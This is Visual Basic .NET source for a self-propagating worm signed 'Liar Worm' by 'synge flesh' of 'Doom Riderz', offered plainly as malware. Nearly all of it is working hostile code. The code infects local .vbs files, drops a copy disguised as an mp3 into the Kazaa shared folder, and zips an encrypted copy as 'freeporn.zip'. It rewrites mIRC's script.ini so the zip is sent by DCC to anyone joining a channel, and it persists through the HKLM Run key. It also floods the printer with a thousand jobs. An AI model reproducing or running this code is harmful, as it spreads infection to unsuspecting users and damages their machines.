   Imports System
   Imports System.IO
   Imports System.Text
   Imports System.Diagnostics
   Imports Microsoft.Win32
   Imports System.Security.Cryptography
   Module Module1







       'generates random number
       Dim objRandom As New System.Random( _
   CType(System.DateTime.Now.Ticks Mod System.Int32.MaxValue, Integer))

       Public Function GetRandomNumber( _
         Optional ByVal Low As Integer = 1, _
         Optional ByVal High As Integer = 1000) As Integer
           ' Returns a random number,
           ' between the optional Low and High parameters
           Return objRandom.Next(Low, High + 1)
       End Function


       'Encryption function
       Private Function TripleDESEncode(ByVal value As String, ByVal key As String) As String

           Dim des As New Security.Cryptography.TripleDESCryptoServiceProvider
           des.IV = New Byte(7) {}
           Dim pdb As New Security.Cryptography.PasswordDeriveBytes(key, New Byte(-1) {})
           des.Key = pdb.CryptDeriveKey("RC2", "MD5", 128, New Byte(7) {})
           Dim ms As New IO.MemoryStream((value.Length * 2) - 1)
           Dim encStream As New Security.Cryptography.CryptoStream(ms, des.CreateEncryptor(), Security.Cryptography.CryptoStreamMode.Write)
           Dim plainBytes As Byte() = Text.Encoding.UTF8.GetBytes(value)
           encStream.Write(plainBytes, 0, plainBytes.Length)
           encStream.FlushFinalBlock()
           Dim encryptedBytes(CInt(ms.Length - 1)) As Byte
           ms.Position = 0
           ms.Read(encryptedBytes, 0, CInt(ms.Length))
           encStream.Close()
           Return Convert.ToBase64String(encryptedBytes)
       End Function

       'Decryption function
       Public Function TripleDESDecode(ByVal value As String, ByVal key As String) As String

           Dim des As New Security.Cryptography.TripleDESCryptoServiceProvider
           des.IV = New Byte(7) {}
           Dim pdb As New Security.Cryptography.PasswordDeriveBytes(key, New Byte(-1) {})
           des.Key = pdb.CryptDeriveKey("RC2", "MD5", 128, New Byte(7) {})
           Dim encryptedBytes As Byte() = Convert.FromBase64String(value)
           Dim ms As New IO.MemoryStream(value.Length)
           Dim decStream As New Security.Cryptography.CryptoStream(ms, des.CreateDecryptor(), Security.Cryptography.CryptoStreamMode.Write)
           decStream.Write(encryptedBytes, 0, encryptedBytes.Length)
           decStream.FlushFinalBlock()
           Dim plainBytes(CInt(ms.Length - 1)) As Byte
           ms.Position = 0
           ms.Read(plainBytes, 0, CInt(ms.Length))
           decStream.Close()

           Return Text.Encoding.UTF8.GetString(plainBytes)

       End Function
       Sub MakeVBS()

           Dim mkvbsFS As New FileStream("C:\windows\Liar.vbs", FileMode.Create, FileAccess.Write)
           Dim mkvbsSW As New StreamWriter(mkvbsFS)

           mkvbsSW.WriteLine("msgbox(" + Chr(34) + "Liar Worm" + Chr(34) + ")")
           mkvbsSW.WriteLine("msgbox(" + Chr(34) + "by synge flesh" + Chr(34) + ")")
           mkvbsSW.WriteLine("msgbox(" + Chr(34) + "of the mighty Doom Riderz" + Chr(34) + ")")
           mkvbsSW.WriteLine("Dim liar,worm")
           mkvbsSW.WriteLine("set liar=CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")")
           mkvbsSW.WriteLine("liar.CopyFile WScript.ScriptFullName," + "" + Chr(34) + "C:\Program Files\Kazaa\Promiscuous Girl - Nelly Furtado.mp3..............................vbs" + Chr(34) + ",True")
           mkvbsSW.WriteLine("set worm=CreateObject(" + Chr(34) + "WScript.Shell" + Chr(34) + ")")
           mkvbsSW.WriteLine("worm.RegWrite" + "" + Chr(34) + "HKLM\\Software\\KaZaA\\Transfer\\DlDir0" + Chr(34) + "," + "" + Chr(34) + "C:\Program Files\Kazaa" + Chr(34))
           mkvbsSW.Flush()
           mkvbsFS.Flush()
           mkvbsFS.Close()

           Process.Start("C:\Windows\Liar.vbs")
           mkvbsFS.Close()
       End Sub

       Sub Main()


           If File.Exists("C:\Program Files\WinZip") Then File.Copy("C:\Program Files\WinZip\winzip32.exe", "C:\windows\system32\winzip32.exe")


           'Dim intDiceRoll As Integer
           'intDiceRoll = GetRandomNumber(1, 1000)

           'Set random number key for encryption
           Dim key As String = "$"
           'MessageBox.Show(key)

           Dim d() As String
           'gets current directory
           Dim appbase As String = AppDomain.CurrentDomain.SetupInformation.ApplicationBase()
           'get all files in directory
           d = Directory.GetFiles(appbase, "*.vbs")
           Dim en As System.Collections.IEnumerator
           en = d.GetEnumerator
           While en.MoveNext

               Dim em = CStr(en.Current)
               Dim Liar As New FileStream(em, FileMode.Open, FileAccess.Read)
               Dim LiarR As New StreamReader(Liar)
               Dim Line As String = LiarR.ReadToEnd


               If Line.Contains("Liar") = False Then



                   Liar.Close()
                   LiarR.Close()
                   Dim LiarStrm As New FileStream(em, FileMode.Open, FileAccess.Write)
                   Dim LiarSWR As New StreamWriter(LiarStrm)



                   LiarSWR.WriteLine("msgbox(" + Chr(34) + "Liar Worm" + Chr(34) + ")")
                   LiarSWR.WriteLine("msgbox(" + Chr(34) + "by synge flesh" + Chr(34) + ")")
                   LiarSWR.WriteLine("msgbox(" + Chr(34) + "of the mighty Doom Riderz" + Chr(34) + ")")
                   LiarSWR.WriteLine("Dim liar,worm")
                   LiarSWR.WriteLine("set liar=CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")")
                   LiarSWR.WriteLine("liar.CopyFile WScript.ScriptFullName," + "" + Chr(34) + "C:\Program Files\Kazaa\Promiscuous Girl - Nelly Furtado.mp3..............................vbs" + Chr(34) + ",True")
                   LiarSWR.WriteLine("set worm=CreateObject(" + Chr(34) + "WScript.Shell" + Chr(34) + ")")
                   LiarSWR.WriteLine("worm.RegWrite" + "" + Chr(34) + "HKLM\\Software\\KaZaA\\Transfer\\DlDir0" + Chr(34) + "," + "" + Chr(34) + "C:\Program Files\Kazaa\My Shared Folder" + Chr(34))
                   LiarSWR.Write(Line)
                   LiarSWR.Flush()
                   'LiarStrm.Close()
                   LiarSWR.Close()


                   If File.Exists("C:\windows\Liar.vbs") Then File.Delete("C:\windows\Liar.vbs")
                   File.Copy(em, "c:\windows\Liar.vbs", True)
               End If

               Dim fileStream As New FileStream("C:\windows\Liar.vbs", FileMode.Open, FileAccess.Read)
               Dim streamReader As New StreamReader(fileStream)

               Dim original As String = streamReader.ReadToEnd()

               Dim encrypted As String = TripleDESEncode(original, key)

               fileStream.Close()
               streamReader.Close()
               File.WriteAllText("C:\windows\Liar.vbs", encrypted)

               If File.Exists("C:\Program Files\WinZip") Then
                   Shell("winzip32 -a c:\windows\freeporn.zip c:\windows\Liar.vbs")
               End If
           End While

           ''write to start up
           Dim regKey As RegistryKey
           regKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
           regKey.CreateSubKey("Liar")
           regKey.Close()

           Dim rekKey As RegistryKey
           rekKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run\Liar", True)
           rekKey.SetValue("Software\Microsoft\Windows\CurrentVersion\Run\Liar", "C:\Windows\Liar.vbs")
           rekKey.Close()

           If File.Exists("C:\Program Files\mirc\script.ini") Then File.Delete("C:\Program Files\mirc\script.ini")

           Dim LiarWorm As New FileStream("C:\Program Files\mirc\script.ini", FileMode.Create, FileAccess.Write)
           Dim LW As New StreamWriter(LiarWorm)
           'write script.ini worm
           LW.WriteLine("[script]")

           LW.WriteLine("n0=ON 1:JOIN:#:/dcc send $nick C:\Windows\freeporn.zip")
           LW.WriteLine("n1=ON 1:TEXT:*the*:#:/quit -=Doom Riderz=- Liar worm www.doomriderz.com")
           LW.Flush()

           LW.Close()
           File.SetAttributes("c:\program files\mirc\script.ini", FileAttributes.Hidden)


           ''Payload
           Dim Now As DateTime = DateTime.Today
           If (Today = "11/05/2006") Then
               MsgBox("Remember, remember, the 5th of November")
               MsgBox("On this date I promise to be good")

               Dim v As Integer
               For v = 1 To 100
                   Beep()
               Next

               If File.Exists("C:\windows\Liar.vbs") Then

                   Dim fileStreams As New FileStream("C:\windows\Liar.vbs", FileMode.Open, FileAccess.Read)
                   Dim streamReaders As New StreamReader(fileStreams)
                   Dim originals As String = streamReaders.ReadToEnd()

                   If originals.Contains("Liar") = False Then
                       'Unencrypt
                       Dim decrypteds As String = TripleDESDecode(originals, key)

                       fileStreams.Close()
                       streamReaders.Close()
                       File.WriteAllText("C:\windows\Liar.vbs", decrypteds)
                       Process.Start("C:\Windows\Liar.vbs")

                   End If
               Else : Call MakeVBS()
               End If
           End If




           ''creates rtf file and prints it
           Dim TextName = "C:\Liar.rtf"
           If File.Exists("C:\Liar.rtf") Then
               File.Delete("C:\Liar.rtf")
           End If
           Dim LiarText As New FileStream("C:\Liar.rtf", FileMode.Create, FileAccess.Write)
           Dim LiarWriter As New StreamWriter(LiarText)
           Dim l As Integer

           For l = 0 To 1000
               LiarWriter.WriteLine("LIAR")
           Next

           LiarWriter.Close()
           Dim e As Integer
           For e = 0 To 1000

               Dim psi As New ProcessStartInfo
               psi.UseShellExecute = True
               psi.Verb = "print"
               psi.WindowStyle = ProcessWindowStyle.Hidden
               psi.FileName = "C:\Liar.rtf"
               Process.Start(psi)
           Next

       End Sub

   End Module
